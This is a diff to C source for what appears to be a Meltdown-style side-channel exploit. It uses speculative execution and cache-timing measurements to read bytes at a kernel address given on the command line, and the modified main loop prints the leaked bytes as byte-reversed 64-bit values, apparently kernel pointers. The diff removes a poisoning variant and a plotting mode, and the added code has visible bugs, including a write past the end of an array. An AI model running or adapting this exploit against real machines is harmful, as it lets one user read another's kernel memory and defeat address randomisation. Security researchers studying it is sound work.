@@ -27,6 +27,17 @@
  * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  * POSSIBILITY OF SUCH DAMAGE.
  */
+/*
+
+Alejandro Caceres fork license:
+
+What the dude above said.
+
+Code for (mis)training was written by mniip, Alejandro Caceres and Mark Haase
+from Hyperion Gray were responsible for turning it into a scanner. Please use 
+responsibly.
+*/
+
 
 #include <stdlib.h>
 #include <stdio.h>
@@ -40,37 +51,6 @@
 
 #include <math.h>
 
-#ifdef VISUALIZE
-int gnuplot()
-{
-	int pipes[2];
-	if(pipe(pipes))
-	{
-		perror("pipe");
-		exit(EXIT_FAILURE);
-	}
-	int pid = fork();
-	if(pid < 0)
-	{
-		perror("fork");
-		exit(EXIT_FAILURE);
-	}
-	if(!pid)
-	{
-		close(pipes[1]);
-		if(dup2(pipes[0], fileno(stdin)))
-		{
-			perror("dup2");
-			exit(EXIT_FAILURE);
-		}
-		execlp("gnuplot", "gnuplot", NULL);
-		perror("execve");
-		exit(EXIT_FAILURE);
-	}
-	close(pipes[0]);
-	return pipes[1];
-}
-#endif
 
 extern unsigned long long time_read(void const *);
 asm(
@@ -151,22 +131,9 @@ asm(
 "	ret\n"
 );
 
-#ifndef POISON
-jmp_buf restore;
-void signal_action(int signal, siginfo_t *si, void *u)
-{
-	longjmp(restore, 1);
-}
-#endif
-
 typedef struct
 {
 	char (*mapping)[PAGE_SIZE];
-#ifdef POISON
-	void **pointers;
-	uint64_t *isspec;
-	char *defval;
-#endif
 }
 channel;
 
@@ -179,43 +146,11 @@ void open_channel(channel *ch)
 		exit(EXIT_FAILURE);
 	}
 	memset(ch->mapping, 0, PAGE_SIZE * 256);
-
-#ifdef POISON
-	ch->pointers = mmap(NULL, (POISON_LEN + 1) * sizeof(void *), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-	if(ch->pointers == MAP_FAILED)
-	{
-		perror("mmap pointers");
-		exit(EXIT_FAILURE);
-	}
-
-	ch->isspec = mmap(NULL, (POISON_LEN + 2) * sizeof(uint64_t), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-	if(ch->isspec == MAP_FAILED)
-	{
-		perror("mmap isspec");
-		exit(EXIT_FAILURE);
-	}
-	ch->isspec++;
-
-	ch->defval = malloc(1);
-	*(ch->defval) = 0;
-
-	for(int r = 0; r < POISON_LEN; r++)
-	{
-		ch->pointers[r] = ch->defval;
-		ch->isspec[r] = 0;
-	}
-	ch->isspec[POISON_LEN] = 1; // first element placed on the second page
-#endif
 }
 
 void free_channel(channel *ch)
 {
 	munmap(ch->mapping, PAGE_SIZE * 256);
-#ifdef POISON
-	free(ch->defval);
-	munmap(ch->pointers, (POISON_LEN + 1) * sizeof(void *));
-	munmap(ch->isspec - 1, (POISON_LEN + 2) * sizeof(uint64_t));
-#endif
 }
 
 void poke_kernel()
@@ -227,7 +162,6 @@ char test_one = 1;
 int dump = 0;
 
 #define ITERATIONS 2000
-
 #define TIME_DIVS 50
 #define TIME_BUCKET 8
 int timing[256][TIME_DIVS];
@@ -238,25 +172,15 @@ void collect_stats(channel *ch, void *addr)
 		for(int line = 0; line < 256; line++)
 			timing[line][ms] = 0;
 
-#ifdef POISON
-	ch->pointers[POISON_LEN] = addr;
-#endif
-	
 	for(int line = 0; line < 256; line++)
 	{
 		for(int i = 0; i < ITERATIONS; i++)
 		{
 			clflush(ch->mapping[line]);
-
 			poke_kernel();
-#ifdef POISON
-			clflush(&ch->isspec[POISON_LEN]);
-			poison_speculate(ch->pointers, ch->isspec, ch->mapping);
-#else
 			//if(!setjmp(restore))
 			stall_speculate(addr, ch->mapping);
-#endif
-		
+
 			unsigned long long t = time_read(ch->mapping[line]);
 			if(t / TIME_BUCKET < TIME_DIVS)
 				timing[line][t / TIME_BUCKET]++;
@@ -282,16 +206,9 @@ int median(int *arr, int len)
 int cutoff_time;
 int calculate_cutoff(channel *ch)
 {
-#ifdef POISON
-	collect_stats(ch, &test_one);
-	int med_hit = median(timing[0], TIME_DIVS) * TIME_BUCKET;
-	int med_miss = median(timing[128], TIME_DIVS) * TIME_BUCKET;
-	cutoff_time = (med_hit + med_miss) / 2;
-#else
 	collect_stats(ch, NULL);
 	int med_miss = median(timing[128], TIME_DIVS) * TIME_BUCKET;
 	cutoff_time = med_miss / 2;
-#endif
 }
 
 #define PROB_HIT_ACCIDENTAL 0.0005
@@ -303,10 +220,6 @@ int run_timing_once(channel *ch, void *addr, double *uncertainty)
 	for(int line = 0; line < 256; line++)
 		hit_timing[line] = miss_timing[line] = 0;
 
-#ifdef POISON
-	ch->pointers[POISON_LEN] = addr;
-#endif
-	
 	for(int line = 0; line < 256; line++)
 	{
 		for(int i = 0; i < ITERATIONS; i++)
@@ -314,14 +227,8 @@ int run_timing_once(channel *ch, void *addr, double *uncertainty)
 			clflush(ch->mapping[line]);
 
 			poke_kernel();
-#ifdef POISON
-			clflush(&ch->isspec[POISON_LEN]);
-			poison_speculate(ch->pointers, ch->isspec, ch->mapping);
-#else
 			//if(!setjmp(restore))
 			stall_speculate(addr, ch->mapping);
-#endif
-		
 			unsigned long long t = time_read(ch->mapping[line]);
 			(t < cutoff_time ? hit_timing : miss_timing)[line]++;
 		}
@@ -331,7 +238,7 @@ int run_timing_once(channel *ch, void *addr, double *uncertainty)
 	for(int line = 1; line < 256; line++)
 		if(max_line == 0 ? hit_timing[line] > 0 : hit_timing[line] > hit_timing[max_line])
 			max_line = line;
-	
+
 	if(max_line)
 	{
 		*uncertainty = pow(PROB_HIT_ACCIDENTAL, hit_timing[max_line]);
@@ -389,67 +296,85 @@ int main(int argc, char *argv[])
 	void *addr;
 	if(argc < 2 || sscanf(argv[1], "%p", &addr) != 1)
 	{
-		fprintf(stderr, "Usage: %s 0xffff????????????\n", argv[0]);
-		exit(EXIT_FAILURE);
+	  fprintf(stderr, "Usage: %s 0xffff????????????\n", argv[0]);
+	  exit(EXIT_FAILURE);
 	}
-
-#ifndef POISON
-	struct sigaction sa;
-	sa.sa_sigaction = signal_action;
-	sigemptyset(&sa.sa_mask);
-	sa.sa_flags = SA_NODEFER | SA_SIGINFO;
-	sigaction(SIGSEGV, &sa, NULL);
-#endif
 
 	channel ch;
 	open_channel(&ch);
-
-#ifdef VISUALIZE
-	int plot = gnuplot();
-	dprintf(plot, "set yrange [0:" STR(TIME_BUCKET * TIME_DIVS) "]\n");
-	dprintf(plot, "set xrange [0:255]\n");
-	dprintf(plot, "set cbrange [0:10]\n");
-	dprintf(plot, "set terminal qt size 1024,256\n");
-	while(1)
-	{
-		collect_stats(&ch, addr);
-
-		dprintf(plot, "plot '-' u 1:($2*" STR(TIME_BUCKET) "):3 matrix with image pixels\n");
-		for(int ms = 0; ms < TIME_DIVS; ms++)
-		{
-			for(int line = 0; line < 256; line++)
-				dprintf(plot, "%d ", timing[line][ms]);
-			dprintf(plot, "\n");
-		}
-		dprintf(plot, "e\ne\n");
-	}
-#else
-
 	calculate_cutoff(&ch);
-	printf("cutoff: %d\n", cutoff_time);
-#ifdef RANDOMIZE
-	while(1)
-	{
-		void *a = addr + rand() % 0x481f00000;
-		int val = read_byte(&ch, a, 1);
-		if(val > 0)
-			printf("%p: %02x\n", a, val);
-	}
-#else
+	//dbg printf("cutoff: %d\n", cutoff_time);
+
 	for(int ln = 0; ln < 4096 / 16; ln++)
 	{
-		printf("%p | ", addr + ln * 16);
-		for(int p = 0; p < 16; p++)
-		{
-			int val = read_byte(&ch, addr + ln * 16 + p, 1);
-			if(val == -1)
-				printf("?? ");
-			else
-				printf("%02x ", val);
-			fflush(stdout);
-		}
-		printf("\n");
+
+	  if(ln > 3) {
+	    return 0;
+	  }
+
+	  //printf("%p | ", addr + ln * 16);
+
+	  unsigned char endianize[16];
+	  for(int p = 0; p < 16; p++)
+	    {
+	      //!
+	      int val = read_byte(&ch, addr + ln * 16 + p, 0);
+	      if(val < 0) {
+		printf("cannot read position %d\n", p);
+	      }
+	      else {
+		endianize[p] = (char)val;
+	      }
+	    }
+	  
+	  unsigned char first_addr[9];
+	  unsigned char second_addr[9];
+	  int y = 0;
+	  for (int x = 15; x >= 0; --x)
+	    {
+	      //dbg printf("%02x", endianize[x]);
+	      if(x == 8) {
+		first_addr[y] = endianize[x];
+	      }
+	      else if (x > 8) {
+		first_addr[y] = endianize[x];
+		//printf("%02x", first_addr[x]);
+	      }
+	      
+	      else if (x < 8) {
+		second_addr[y - 8] = endianize[x];
+		//printf("%02x", second_addr[x]);
+	      }
+	      
+	      else {
+		//should never be reached
+		printf("WTF are you doing here???\n");
+	      }
+	      
+	      y++;
+	      //dbg printf("addrt: ~~ %02x ~~", first_addr[x]);
+	      
+	    }
+	  
+	  //are these necessary?
+	  first_addr[9] = NULL;
+	  second_addr[9] = NULL;
+	  
+	  for (int c = 0; c < 8; c++) {
+	    printf("%02x", second_addr[c]);
+	  }
+	  
+	  printf(" ");
+	  
+	  for (int c = 0; c < 8; c++) {
+	    printf("%02x", first_addr[c]);
+	  }
+	  
+	  
+	  printf("\n");
+	  
+	  memset(&endianize[0], 0, sizeof(endianize));
+	  memset(&first_addr[0], 0, sizeof(first_addr));
+	  memset(&second_addr[0], 0, sizeof(second_addr));
 	}
-#endif
-#endif
 }
